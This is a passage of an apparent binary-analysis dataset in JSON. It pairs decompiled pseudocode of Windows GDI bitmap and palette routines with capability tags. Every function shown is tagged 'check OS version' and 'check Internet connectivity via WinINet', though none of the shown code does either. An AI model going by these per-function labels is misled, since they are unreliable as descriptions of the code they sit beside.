        "decompiled_code": "\nuint __cdecl fcn.00428a88(int32_t arg_8h, int32_t arg_ch)\n\n{\n    uchar *puVar1;\n    int16_t iVar2;\n    int16_t iVar3;\n    int32_t in_EAX;\n    int32_t iVar4;\n    uint uVar5;\n    uint uVar6;\n    int32_t in_EDX;\n    uint32_t uVar7;\n    uint uVar8;\n    uint *puVar9;\n    uint *puVar10;\n    int32_t *in_FS_OFFSET;\n    uint *puStack312;\n    int32_t iStack308;\n    uchar *puStack304;\n    int32_t iStack300;\n    int32_t iStack296;\n    int32_t iStack292;\n    uint *puStack288;\n    int32_t iStack272;\n    int32_t iStack268;\n    uchar *puStack264;\n    uint *puStack260;\n    int32_t iStack256;\n    int32_t iStack252;\n    uint *puStack248;\n    code *pcStack244;\n    uint *puStack240;\n    uchar *puStack236;\n    int32_t iStack232;\n    int32_t iStack228;\n    uchar *puStack224;\n    int32_t iStack220;\n    uint uStack216;\n    int32_t iStack212;\n    uint uStack208;\n    uchar *puStack204;\n    int32_t iStack200;\n    uint uStack196;\n    uchar *puStack192;\n    int32_t iStack188;\n    uint uStack184;\n    int32_t iStack180;\n    uint uStack176;\n    uint *puStack172;\n    uint lprc;\n    uint lpvObject;\n    int32_t var_84h;\n    int32_t var_80h;\n    int32_t var_74h;\n    int32_t var_70h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    int32_t var_28h;\n    uint *pbmi;\n    int32_t var_20h;\n    int32_t hdcDest;\n    int32_t hdc;\n    uint var_14h;\n    uint var_10h;\n    int32_t hpal;\n    int32_t var_8h;\n    int32_t hgdiobj;\n    \n    puStack236 = &stack0xfffffffc;\n    var_10h = 0;\n    if (((*(arg_ch + 0x18) == 0) || ((*(arg_ch + 0x1c) != 0 && (*(arg_ch + 0x20) != 0)))) &&\n       ((*(arg_ch + 0x18) != 0 || ((*(arg_ch + 4) != 0 && (*(arg_ch + 8) != 0)))))) {\n        puStack172 = 0x428af0;\n        var_8h = in_EDX;\n        hgdiobj = in_EAX;\n        fcn.00428644();\n        var_70h = 0;\n        if (hgdiobj != 0) {\n            puStack172 = &fcn.00428a88::lpvObject;\n            uStack176 = 0x54;\n            iStack180 = hgdiobj;\n            uStack184 = 0x428b0d;\n            iVar4 = sub.gdi32.dll_GetObjectA();\n            if (iVar4 < 0x18) {\n                uStack184 = 0x428b17;\n                fcn.00425978();\n            }\n        }\n        uStack184 = 0;\n        iStack188 = 0x428b1e;\n        sub.user32.dll_GetDC();\n        iStack188 = 0x428b23;\n        iStack188 = fcn.00425a98();\n        puStack192 = 0x428b2f;\n        hdc = iStack188;\n        sub.gdi32.dll_CreateCompatibleDC();\n        puStack192 = 0x428b34;\n        hdcDest = fcn.00425a98();\n        uStack196 = 0x4290d6;\n        iStack200 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffff38;\n        if (*(arg_ch + 0x18) < 0x28) {\n            if ((*(arg_ch + 0x10) | *(arg_ch + 0x12)) == 1) {\n                puStack204 = NULL;\n                uStack208 = 1;\n                iStack212 = 1;\n                uStack216 = *(arg_ch + 8);\n                iStack220 = *(arg_ch + 4);\n                puStack224 = 0x428b7b;\n                puStack192 = &stack0xfffffffc;\n                sub.gdi32.dll_CreateBitmap();\n                puStack224 = 0x428b80;\n                var_10h = fcn.00425a98();\n            }\n            else {\n                puStack204 = *(arg_ch + 8);\n                uStack208 = *(arg_ch + 4);\n                iStack212 = hdc;\n                uStack216 = 0x428b9f;\n                puStack192 = &stack0xfffffffc;\n                sub.gdi32.dll_CreateCompatibleBitmap();\n                uStack216 = 0x428ba4;\n                var_10h = fcn.00425a98();\n            }\n            uStack216 = 0x428def;\n            fcn.00425a98();\n            uStack216 = var_10h;\n            iStack220 = hdcDest;\n            puStack224 = 0x428dfc;\n            sub.gdi32.dll_SelectObject();\n            puStack224 = 0x428e01;\n            var_14h = fcn.00425a98();\n            iStack228 = 0x429087;\n            iStack232 = *in_FS_OFFSET;\n            *in_FS_OFFSET = &stack0xffffff18;\n            puStack240 = 0x429076;\n            pcStack244 = *in_FS_OFFSET;\n            *in_FS_OFFSET = &stack0xffffff0c;\n            var_34h = 0;\n            uVar8 = 0;\n            puVar1 = &stack0xfffffffc;\n            puStack224 = &stack0xfffffffc;\n            if (hpal != 0) {\n                puStack248 = NULL;\n                iStack252 = hpal;\n                iStack256 = hdcDest;\n                puStack260 = 0x428e3c;\n                puStack224 = &stack0xfffffffc;\n                var_34h = sub.gdi32.dll_SelectPalette();\n                puStack260 = hdcDest;\n                puStack264 = 0x428e48;\n                sub.gdi32.dll_RealizePalette();\n                puVar1 = puStack236;\n            }\n            puStack236 = puVar1;\n            iStack268 = 0x429054;\n            iStack272 = *in_FS_OFFSET;\n            *in_FS_OFFSET = &stack0xfffffef0;\n            if (arg_8h == 0) {\n                puStack288 = NULL;\n                iStack292 = 0;\n                iStack296 = hdcDest;\n                iStack300 = 0x428f35;\n                puStack264 = &stack0xfffffffc;\n                sub.gdi32.dll_PatBlt();\n            }\n            else {\n                puStack264 = &stack0xfffffffc;\n                fcn.00424f6c();\n                puStack288 = 0x428e89;\n                fcn.00418438(&fcn.00428a88::lprc, *(arg_ch + 8));\n                puStack288 = &fcn.00428a88::lprc;\n                iStack292 = hdcDest;\n                iStack296 = 0x428e99;\n                sub.user32.dll_FillRect();\n                iStack296 = 0x428ea7;\n                iStack296 = fcn.004241b0();\n                iStack300 = hdcDest;\n                puStack304 = 0x428eb1;\n                sub.gdi32.dll_SetTextColor();\n                puStack304 = 0x428ebc;\n                fcn.00424f30();\n                puStack304 = 0x428ec1;\n                puStack304 = fcn.004241b0();\n                iStack308 = hdcDest;\n                puStack312 = 0x428ecb;\n                sub.gdi32.dll_SetBkColor();\n                if ((*(arg_ch + 0x26) == 1) && (*(arg_ch + 0x14) != 0)) {\n                    puStack312 = 0x428eec;\n                    var_30h = fcn.004241b0();\n                    puStack312 = 0x428efa;\n                    fcn.00424f30();\n                    puStack312 = 0x428eff;\n                    var_2ch = fcn.004241b0();\n                    puStack312 = &fcn.00428a88::var_30h;\n                    sub.gdi32.dll_SetDIBColorTable(hdcDest, 0, 2);\n                }\n            }\n            if (hgdiobj != 0) {\n                iStack300 = hdc;\n                puStack304 = 0x428f48;\n                sub.gdi32.dll_CreateCompatibleDC();\n                puStack304 = 0x428f4d;\n                var_20h = fcn.00425a98();\n                iStack308 = 0x42902a;\n                puStack312 = *in_FS_OFFSET;\n                *in_FS_OFFSET = &stack0xfffffec8;\n                puStack304 = &stack0xfffffffc;\n                sub.gdi32.dll_SelectObject(var_20h, hgdiobj);\n                uVar5 = fcn.00425a98();\n                if (var_8h != 0) {\n                    uVar8 = sub.gdi32.dll_SelectPalette(var_20h, var_8h, 0);\n                    sub.gdi32.dll_RealizePalette(var_20h);\n                }\n                if (arg_8h != 0) {\n                    uVar6 = fcn.004241b0();\n                    sub.gdi32.dll_SetTextColor(var_20h, uVar6);\n                    fcn.00424f30();\n                    uVar6 = fcn.004241b0();\n                    sub.gdi32.dll_SetBkColor(var_20h, uVar6);\n                }\n                sub.gdi32.dll_BitBlt(hdcDest, 0, 0, *(arg_ch + 4), *(arg_ch + 8), var_20h, 0, 0, 0xcc0020);\n                if (var_8h != 0) {\n                    sub.gdi32.dll_SelectPalette(var_20h, uVar8, 0xffffffff);\n                }\n                iVar4 = var_20h;\n                sub.gdi32.dll_SelectObject(var_20h, uVar5);\n                fcn.00425a98();\n                *in_FS_OFFSET = iVar4;\n                uVar8 = sub.gdi32.dll_DeleteDC(var_20h, 0x429031);\n                return uVar8;\n            }\n            uVar8 = 0;\n            *in_FS_OFFSET = iStack296;\n            puStack288 = 0x42905b;\n            if (hpal != 0) {\n                iStack292 = 0xffffffff;\n                iStack296 = var_34h;\n                iStack300 = hdcDest;\n                puStack304 = 0x429053;\n                uVar8 = sub.gdi32.dll_SelectPalette();\n            }\n            return uVar8;\n        }\n        puStack204 = 0x428bb6;\n        puStack192 = &stack0xfffffffc;\n        pbmi = fcn.00402f00();\n        uStack208 = 0x428de0;\n        iStack212 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffff2c;\n        *(arg_ch + 0x18) = 0x28;\n        *(arg_ch + 0x24) = 1;\n        puStack204 = &stack0xfffffffc;\n        if (*(arg_ch + 0x26) == 0) {\n            uStack216 = 0xc;\n            iStack220 = hdc;\n            puStack224 = 0x428bef;\n            puStack204 = &stack0xfffffffc;\n            iVar2 = sub.gdi32.dll_GetDeviceCaps();\n            puStack224 = 0xe;\n            iStack228 = hdc;\n            iStack232 = 0x428bfc;\n            iVar3 = sub.gdi32.dll_GetDeviceCaps();\n            *(arg_ch + 0x26) = iVar2 * iVar3;\n        }\n        puVar9 = arg_ch + 0x18;\n        puVar10 = pbmi;\n        for (iVar4 = 10; iVar4 != 0; iVar4 = iVar4 + -1) {\n            *puVar10 = *puVar9;\n            puVar9 = puVar9 + 1;\n            puVar10 = puVar10 + 1;\n        }\n        *(arg_ch + 4) = *(arg_ch + 0x1c);\n        *(arg_ch + 8) = *(arg_ch + 0x20);\n        if (*(arg_ch + 0x26) < 9) {\n            if ((*(arg_ch + 0x26) == 1) && ((hgdiobj == 0 || (var_74h == 0)))) {\n                pbmi[10] = 0;\n                pbmi[0xb] = 0xffffff;\n            }\n            else if (hpal == 0) {\n                if (hgdiobj != 0) {\n                    iStack232 = hgdiobj;\n                    puStack236 = hdcDest;\n                    puStack240 = 0x428ca6;\n                    var_14h = sub.gdi32.dll_SelectObject();\n                    if ((var_70h == 0) || (var_74h == 0)) {\n                        puStack240 = NULL;\n                        pcStack244 = pbmi;\n                        puStack248 = NULL;\n                        uVar7 = *(arg_ch + 0x20) >> 0x1f;\n                        iStack252 = (*(arg_ch + 0x20) ^ uVar7) - uVar7;\n                        iStack256 = 0;\n                        puStack260 = hgdiobj;\n                        puStack264 = hdcDest;\n                        iStack268 = 0x428cf7;\n                        sub.gdi32.dll_GetDIBits();\n                    }\n                    else {\n                        puStack240 = pbmi + 10;\n                        pcStack244 = pe_nt_image_headers32;\n                        puStack248 = NULL;\n                        iStack252 = hdcDest;\n                        iStack256 = 0x428ccc;\n                        uVar8 = sub.gdi32.dll_GetDIBColorTable();\n                        *(arg_ch + 0x38) = uVar8;\n                    }\n                    puStack224 = var_14h;\n                    iStack228 = hdcDest;\n                    iStack232 = 0x428d04;\n                    sub.gdi32.dll_SelectObject();\n                }\n            }\n            else {\n                iStack232 = 0x428c8a;\n                fcn.00426234();\n            }\n        }\n        else if (((*(arg_ch + 0x26) == 0x10) || (*(arg_ch + 0x26) == 0x20)) && ((*(arg_ch + 0x28) & 3) != 0)) {\n            iStack232 = 0x428d2d;\n            fcn.00428a3c();\n            iStack232 = 0x428d43;\n            fcn.004030fc();\n        }\n        iStack232 = 0;\n        puStack236 = NULL;\n        puStack240 = &fcn.00428a88::var_28h;\n        pcStack244 = NULL;\n        puStack248 = pbmi;\n        iStack252 = hdc;\n        iStack256 = 0x428d5a;\n        sub.gdi32.dll_CreateDIBSection();\n        iStack256 = 0x428d5f;\n        var_10h = fcn.00425a98();\n        if (var_28h == 0) {\n            iStack256 = 0x428d6d;\n            fcn.004259f0();\n        }\n        if ((((hgdiobj == 0) || (*(arg_ch + 0x1c) != var_84h)) || (*(arg_ch + 0x20) != var_80h)) ||\n           (*(arg_ch + 0x26) < 9)) {\n            *in_FS_OFFSET = iStack252;\n            pcStack244 = 0x428de7;\n            puStack248 = 0x428ddf;\n            uVar8 = fcn.00402f1c();\n            return uVar8;\n        }\n        iStack256 = 0;\n        puStack260 = pbmi;\n        puStack264 = var_28h;\n        uVar7 = *(arg_ch + 0x20) >> 0x1f;\n        iStack268 = (*(arg_ch + 0x20) ^ uVar7) - uVar7;\n        iStack272 = 0;\n        sub.gdi32.dll_GetDIBits();\n        fcn.00404f70();\n        fcn.00404f70();\n    }\n    return var_10h;\n}\n",
        "token_count": 3767
    },
    "004290ec": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint fcn.004290ec(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint uVar2;\n    uint uStack1064;\n    int32_t iStack1060;\n    uchar *puStack1056;\n    int32_t iStack1052;\n    uint uStack1048;\n    uchar *puStack1044;\n    uint uStack1040;\n    \n    puStack1044 = &stack0xfffffbf0;\n    uVar2 = 0;\n    if (in_EAX != 0) {\n        uStack1040 = 0;\n        uStack1048 = 4;\n        puStack1056 = 0x42910a;\n        iStack1052 = in_EAX;\n        iVar1 = sub.gdi32.dll_GetObjectA();\n        if ((iVar1 != 0) && (iStack1052 != 0)) {\n            uStack1048 = CONCAT22(iStack1052, 0x300);\n            puStack1056 = &stack0xfffffbec;\n            iStack1060 = iStack1052;\n            uStack1064 = 0;\n            sub.gdi32.dll_GetPaletteEntries();\n            uVar2 = sub.gdi32.dll_CreatePalette(&stack0xfffffbd8);\n        }\n    }\n    return uVar2;\n}\n",
        "token_count": 297
    },
    "00429150": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00429150(int32_t param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint uVar2;\n    int32_t *in_FS_OFFSET;\n    int32_t in_stack_fffffec8;\n    int32_t in_stack_ffffff24;\n    int32_t iStack204;\n    uint uStack200;\n    uchar *puStack196;\n    int32_t iStack192;\n    int32_t iStack188;\n    int32_t iStack184;\n    uint uStack180;\n    uint uStack176;\n    uint uStack172;\n    uint uStack168;\n    uint uStack164;\n    int32_t iStack160;\n    uint uStack156;\n    int32_t iStack152;\n    uint uStack148;\n    uchar *puStack144;\n    uint uStack136;\n    uint *puStack132;\n    uint lpvObject;\n    uint nWidth;\n    uint nHeight;\n    int32_t var_5ch;\n    uint var_58h;\n    int32_t var_1ch;\n    int32_t var_18h;\n    char var_11h;\n    int32_t hdcDest;\n    int32_t hdc;\n    int32_t var_8h;\n    int32_t hgdiobj;\n    \n    hgdiobj = 0;\n    if (in_EAX != 0) {\n        puStack132 = &fcn.00429150::lpvObject;\n        uStack136 = 0x54;\n        puStack144 = 0x429178;\n        iVar1 = sub.gdi32.dll_GetObjectA();\n        if (iVar1 != 0) {\n            puStack144 = 0x429187;\n            fcn.00428644();\n            var_8h = 0;\n            hdcDest = 0;\n            uStack148 = 0x42934b;\n            iStack152 = *in_FS_OFFSET;\n            *in_FS_OFFSET = &stack0xffffff68;\n            uStack156 = 0;\n            iStack160 = 0x4291a6;\n            puStack144 = &stack0xfffffffc;\n            sub.user32.dll_GetDC();\n            iStack160 = 0x4291ab;\n            iStack160 = fcn.00425a98();\n            uStack164 = 0x4291b7;\n            var_8h = iStack160;\n            sub.gdi32.dll_CreateCompatibleDC();\n            uStack164 = 0x4291bc;\n            hdcDest = fcn.00425a98();\n            uStack164 = 0;\n            uStack168 = 1;\n            uStack172 = 1;\n            uStack176 = nHeight;\n            uStack180 = nWidth;\n            iStack184 = 0x4291d2;\n            hgdiobj = sub.gdi32.dll_CreateBitmap();\n            if (hgdiobj != 0) {\n                iStack188 = hdcDest;\n                iStack192 = 0x4291ec;\n                iStack184 = hgdiobj;\n                var_1ch = sub.gdi32.dll_SelectObject();\n                if (param_1 != 0x1fffffff) {\n                    iStack192 = var_8h;\n                    puStack196 = 0x42921c;\n                    sub.gdi32.dll_CreateCompatibleDC();\n                    puStack196 = 0x429221;\n                    hdc = fcn.00425a98();\n                    uStack200 = 0x429303;\n                    iStack204 = *in_FS_OFFSET;\n                    *in_FS_OFFSET = &stack0xffffff34;\n                    if (var_5ch == 0) {\n                        var_11h = '\\0';\n                        puStack196 = &stack0xfffffffc;\n                    }\n                    else {\n                        var_11h = '\\x01';\n                        var_58h = 0;\n                        puStack196 = &stack0xfffffffc;\n                        in_EAX = fcn.00428a88(0, &fcn.00429150::lpvObject);\n                    }\n                    var_18h = sub.gdi32.dll_SelectObject(hdc, in_EAX);\n                    if (param_2 != 0) {\n                        sub.gdi32.dll_SelectPalette(hdc, param_2, 0);\n                        sub.gdi32.dll_RealizePalette(hdc);\n                        sub.gdi32.dll_SelectPalette(hdcDest, param_2, 0);\n                        sub.gdi32.dll_RealizePalette(hdcDest);\n                    }\n                    uVar2 = sub.gdi32.dll_SetBkColor(hdc, param_1);\n                    sub.gdi32.dll_BitBlt(hdcDest, 0, 0, nWidth, nHeight, hdc, 0, 0, 0xcc0020);\n                    sub.gdi32.dll_SetBkColor(hdc, uVar2);\n                    if (var_18h != 0) {\n                        in_stack_fffffec8 = hdc;\n                        sub.gdi32.dll_SelectObject(hdc, var_18h);\n                    }\n                    if (var_11h != '\\0') {\n                        sub.gdi32.dll_DeleteObject(in_EAX);\n                    }\n                    *in_FS_OFFSET = in_stack_fffffec8;\n                    uVar2 = sub.gdi32.dll_DeleteDC(hdc, 0x42930a);\n                    return uVar2;\n                }\n                iStack192 = 0x42;\n                puStack196 = nHeight;\n                uStack200 = nWidth;\n                iStack204 = 0;\n                sub.gdi32.dll_PatBlt(hdcDest, 0);\n                if (var_1ch != 0) {\n                    in_stack_ffffff24 = hdcDest;\n                    sub.gdi32.dll_SelectObject(hdcDest, var_1ch);\n                }\n            }\n            uVar2 = 0;\n            *in_FS_OFFSET = in_stack_ffffff24;\n            if (hdcDest != 0) {\n                uVar2 = sub.gdi32.dll_DeleteDC(hdcDest, 0x429352);\n            }\n            if (var_8h != 0) {\n                uVar2 = sub.user32.dll_ReleaseDC(0, var_8h);\n            }\n            return uVar2;\n        }\n    }\n    return hgdiobj;\n}\n",
        "token_count": 1341
    },
    "0042935c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t * __fastcall fcn.0042935c(uint param_1, char param_2)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00404974();\n        param_2 = extraout_DL;\n    }\n    fcn.00426c34();\n    in_EAX[0xd] = 0x20000000;\n    iVar1 = fcn.00404620();\n    in_EAX[10] = iVar1;\n    fcn.004288b4();\n    if (*0x48fbb8 != '\\0') {\n        (**(*in_EAX + 0x70))();\n    }\n    if (param_2 != '\\0') {\n        fcn.004049cc();\n        *in_FS_OFFSET = uStack28;\n    }\n    return in_EAX;\n}\n",
        "token_count": 218
    },
    "00429660": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00429660(int32_t *param_1, int32_t param_2)\n\n{\n    bool bVar1;\n    char cVar2;\n    int32_t *in_EAX;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t arg_2ch;\n    int32_t arg_28h;\n    int32_t iVar5;\n    int32_t iVar6;\n    uint *in_FS_OFFSET;\n    uint uVar7;\n    uint uStack108;\n    uint uStack104;\n    uchar *puStack100;\n    uint *puStack96;\n    uint uStack92;\n    uchar *puStack88;\n    uint uStack84;\n    uint *puStack80;\n    uint uStack76;\n    uint uStack72;\n    uint uStack68;\n    uint uStack64;\n    uint uStack60;\n    uint uStack56;\n    int32_t iStack52;\n    uint uStack48;\n    uint var_1ch;\n    uint var_18h;\n    uint var_11h;\n    uint var_dh;\n    char var_9h;\n    uint var_8h;\n    int32_t var_4h;\n    \n    iVar6 = in_EAX[10];\n    uStack48 = 0x429682;\n    var_4h = param_2;\n    fcn.00425770();\n    uStack48 = 0x429689;\n    fcn.00429cdc();\n    var_8h = 0;\n    var_9h = 0;\n    iVar3 = *(iVar6 + 0x10);\n    if (iVar3 != 0) {\n        uStack48 = 0xffffffff;\n        uStack56 = *(var_4h + 4);\n        uStack60 = 0x4296a8;\n        iStack52 = iVar3;\n        var_8h = sub.gdi32.dll_SelectPalette();\n        uStack60 = *(var_4h + 4);\n        uStack64 = 0x4296b7;\n        sub.gdi32.dll_RealizePalette();\n    }\n    uStack64 = 0xc;\n    uStack68 = *(var_4h + 4);\n    uStack72 = 0x4296c9;\n    var_9h = iVar3 != 0;\n    uStack72 = sub.gdi32.dll_GetDeviceCaps();\n    uStack76 = 0xe;\n    puStack80 = *(var_4h + 4);\n    uStack84 = 0x4296d8;\n    iVar3 = sub.gdi32.dll_GetDeviceCaps();\n    if ((puStack80 * iVar3 < 9) && (puStack80 * iVar3 < *(iVar6 + 0x2a) * *(iVar6 + 0x28))) {\n        bVar1 = true;\n    }\n    else {\n        bVar1 = false;\n    }\n    if (bVar1) {\n        puStack80 = &fcn.00429660::var_11h;\n        uStack84 = *(var_4h + 4);\n        puStack88 = 0x42970b;\n        sub.gdi32.dll_GetBrushOrgEx();\n        puStack88 = 0x4;\n        uStack92 = *(var_4h + 4);\n        puStack96 = 0x429719;\n        sub.gdi32.dll_SetStretchBltMode();\n        puStack96 = &fcn.00429660::var_11h;\n        puStack100 = var_dh;\n        uStack104 = var_11h;\n        uStack108 = *(var_4h + 4);\n        sub.gdi32.dll_SetBrushOrgEx();\n    }\n    else {\n        puStack80 = 0x42973a;\n        cVar2 = fcn.004299ec();\n        if (cVar2 == '\\0') {\n            puStack80 = 0x3;\n            uStack84 = 0x429748;\n            uStack84 = fcn.00425694();\n            puStack88 = 0x42974e;\n            sub.gdi32.dll_SetStretchBltMode();\n        }\n    }\n    uStack92 = 0x42989e;\n    puStack96 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffa0;\n    puStack100 = 0x429763;\n    puStack88 = &stack0xfffffffc;\n    cVar2 = (**(*in_EAX + 0x28))();\n    if (cVar2 != '\\0') {\n        puStack100 = 0x42976e;\n        fcn.00429c7c();\n    }\n    puStack100 = 0x429775;\n    fcn.00429930();\n    puStack100 = 0x429781;\n    fcn.00425770();\n    puStack100 = 0x429788;\n    cVar2 = (**(*in_EAX + 0x28))();\n    if (cVar2 != '\\0') {\n        uStack104 = 0x429833;\n        uStack108 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffff94;\n        puStack100 = &stack0xfffffffc;\n        sub.gdi32.dll_CreateCompatibleDC(0);\n        iVar3 = fcn.00425a98();\n        iVar4 = sub.gdi32.dll_SelectObject(iVar3, *(iVar6 + 0xc));\n        arg_2ch = param_1[2] - *param_1;\n        arg_28h = param_1[3] - param_1[1];\n        iVar5 = fcn.00429930();\n        uVar7 = 0;\n        fcn.00425c48(0, 0, iVar3, *(iVar6 + 0x20), *(iVar6 + 0x1c), 0, 0, *(iVar5 + 4), arg_28h, arg_2ch);\n        *in_FS_OFFSET = uVar7;\n        if (iVar4 != 0) {\n            sub.gdi32.dll_SelectObject(iVar3, iVar4, 0x429878);\n        }\n        if (iVar3 != 0) {\n            sub.gdi32.dll_DeleteDC(iVar3);\n        }\n        return;\n    }\n    puStack100 = *(var_4h + 0x20);\n    uStack104 = *(iVar6 + 0x20);\n    uStack108 = *(iVar6 + 0x1c);\n    iVar6 = fcn.00429930(0, 0);\n    uVar7 = *(var_4h + 4);\n    sub.gdi32.dll_StretchBlt(uVar7, *param_1, param_1[1], param_1[2] - *param_1, param_1[3] - param_1[1], *(iVar6 + 4));\n    *in_FS_OFFSET = uVar7;\n    if (var_9h != '\\0') {\n        sub.gdi32.dll_SelectPalette(*(var_4h + 4), var_8h, 0xffffffff, 0x4298a5);\n    }\n    return;\n}\n",
        "token_count": 1559
    },
    "004298b0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.004298b0(void)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    \n    iVar1 = *(in_EAX + 0x28);\n    if (1 < *(iVar1 + 4)) {\n        fcn.00429bdc();\n        fcn.004294fc(iVar1 + 0x18);\n        return;\n    }\n    if ((*(iVar1 + 8) != 0) && (*(iVar1 + 8) != *(iVar1 + 0x14))) {\n        if ((*(iVar1 + 0x14) != 0) && (iVar2 = sub.gdi32.dll_DeleteObject(*(iVar1 + 0x14)),  iVar2 == 0)) {\n            fcn.004259f0();\n        }\n        *(iVar1 + 0x14) = 0;\n        *(iVar1 + 0x2c) = 0;\n    }\n    return;\n}\n",
        "token_count": 216
    },
    "00429930": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t fcn.00429930(void)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    \n    if (in_EAX[0xb] == 0) {\n        fcn.00429bdc();\n        if (in_EAX[0xb] == 0) {\n            iVar1 = fcn.004286c0();\n            in_EAX[0xb] = iVar1;\n            *(iVar1 + 0x2c) = in_EAX;\n            *(iVar1 + 0x28) = *(*in_EAX + 0x10);\n            *(iVar1 + 0x34) = in_EAX;\n            *(iVar1 + 0x30) = fcn.004295bc;\n        }\n    }\n    return in_EAX[0xb];\n}\n",
        "token_count": 177
    },
    "0042999c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.0042999c(void)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    unkbyte3 Var3;\n    uint uVar2;\n    \n    iVar1 = *(in_EAX + 0x28);\n    Var3 = iVar1 >> 8;\n    if ((*(iVar1 + 8) == 0) || (*(iVar1 + 8) == *(iVar1 + 0x14))) {\n        if (*(iVar1 + 0x14) != 0) {\n            return 0;\n        }\n        if (*(iVar1 + 0x30) == 0) {\n            uVar2 = CONCAT31(Var3, 1);\n        }\n        else {\n            uVar2 = 0;\n        }\n    }\n    else {\n        uVar2 = CONCAT31(Var3, 1);\n    }\n    return uVar2;\n}\n",
        "token_count": 194
    },
    "00429b58": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00429b58(void)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    uint uVar2;\n    \n    iVar1 = *(in_EAX + 0x28);\n    if ((*(iVar1 + 8) != 0) && (*(iVar1 + 0x14) == 0)) {\n        fcn.00429cdc();\n        if (*(iVar1 + 0x30) == 0) {\n            sub.gdi32.dll_GetObjectA(*(iVar1 + 8), 0x54, iVar1 + 0x18);\n            *(iVar1 + 0x30) = 0x28;\n            *(iVar1 + 0x34) = *(iVar1 + 0x1c);\n            *(iVar1 + 0x38) = *(iVar1 + 0x20);\n            *(iVar1 + 0x3c) = 1;\n            *(iVar1 + 0x3e) = *(iVar1 + 0x28) * *(iVar1 + 0x2a);\n        }\n        uVar2 = fcn.00428a88(0, iVar1 + 0x18);\n        *(iVar1 + 0x14) = uVar2;\n    }\n    return;\n}\n",
        "token_count": 280
    },
    "00429bdc": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00429bdc(void)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t *in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStackY40;\n    uint uStackY36;\n    uchar *puStackY32;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    \n    iVar1 = in_EAX[10];\n    if (((*(iVar1 + 8) == 0) && (*(iVar1 + 0x14) == 0)) && (*(iVar1 + 0x6c) != 0)) {\n        puStackY32 = 0x429c09;\n        fcn.0041b724(0, 0);\n        iVar1 = in_EAX[4];\n        iVar2 = in_EAX[5];\n        uStackY36 = 0x429c5f;\n        uStackY40 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffd8;\n        in_EAX[4] = 0;\n        in_EAX[5] = 0;\n        puStackY32 = &stack0xfffffffc;\n        (**(*in_EAX + 0x54))();\n        *in_FS_OFFSET = uStackY40;\n        in_EAX[4] = iVar1;\n        in_EAX[5] = iVar2;\n        return;\n    }\n    iVar1 = in_EAX[10];\n    if (*(iVar1 + 8) == 0) {\n        *(iVar1 + 8) = *(iVar1 + 0x14);\n    }\n    return;\n}\n",
        "token_count": 356
    },
    "00429c7c": {
